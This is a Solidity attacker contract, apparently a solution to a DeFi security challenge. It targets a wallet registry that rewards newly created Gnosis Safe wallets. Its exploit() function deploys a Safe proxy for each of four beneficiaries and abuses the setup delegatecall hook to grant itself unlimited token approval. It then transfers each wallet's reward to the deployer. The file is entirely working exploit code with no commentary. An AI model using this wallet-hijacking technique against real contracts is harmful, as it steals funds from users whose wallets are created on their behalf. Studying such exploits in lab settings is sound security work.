// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "hardhat/console.sol";

contract WalletRegistryAttacker {
    GnosisSafeProxyFactory immutable factory;
    address immutable masterCopy;
    address immutable callback;
    address immutable owner;
    address immutable token;
    address[4] private targets;
    uint256 constant MAX_THRESHOLD = 1;

    constructor(
        address _callback,
        address[4] memory _targets,
        address _token,
        address _factory,
        address _masterCopy
    ) {
        callback = _callback;
        targets = _targets;
        owner = msg.sender;
        token = _token;
        factory = GnosisSafeProxyFactory(_factory);
        masterCopy = _masterCopy;
    }

    function exploit() external {
        bytes memory callApproveData;
        {
            callApproveData = abi.encodeWithSignature(
                "makeApprove(address,address)",
                token,
                address(this)
            );
        }

        for (uint8 i = 0; i < targets.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = targets[i];
            bytes memory callSetupData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                callApproveData,
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                masterCopy,
                callSetupData,
                i,
                IProxyCreationCallback(callback)
            );
            IERC20(token).transferFrom(address(proxy), owner, 10 ether);
        }
    }

    // use for delegate call from safe wallet when executing setupModules(to,data)
    function makeApprove(address _token, address account) external {
        IERC20(_token).approve(account, type(uint256).max);
    }
}
